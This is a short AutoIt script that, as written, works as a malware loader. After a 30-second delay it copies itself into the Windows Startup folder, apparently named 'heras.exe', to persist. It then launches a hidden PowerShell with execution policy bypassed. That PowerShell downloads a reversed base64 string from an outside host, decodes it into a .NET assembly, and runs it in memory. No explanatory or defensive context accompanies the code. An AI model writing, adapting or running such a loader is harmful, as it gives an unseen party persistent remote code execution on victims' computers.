

For $i = 30 To 1 Step -1
    Sleep(1000)
 Next

If Not FileExists(@StartupDir & "/" & "heras.exe") Then
  FileCopy(@ScriptFullPath, @StartupDir, 1)
EndIf

RunWait("cmd /c start /b powershell -noexit -exec bypass -window 1 " & _
"$web = New-Object System.Net.WebClient;" & _
"$string = $web.Downloadstring('https://www.xnon.io/tools/base64.txt');" & _
"$assembly = [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String(-join $string[-1..-$string.Length]));" & _
"$methodInfo = $assembly.EntryPoint; $create = $assembly.CreateInstance($methodInfo.Name);" & _
"$methodInfo.Invoke($create,$null) & exit", @SystemDir, @SW_HIDE)
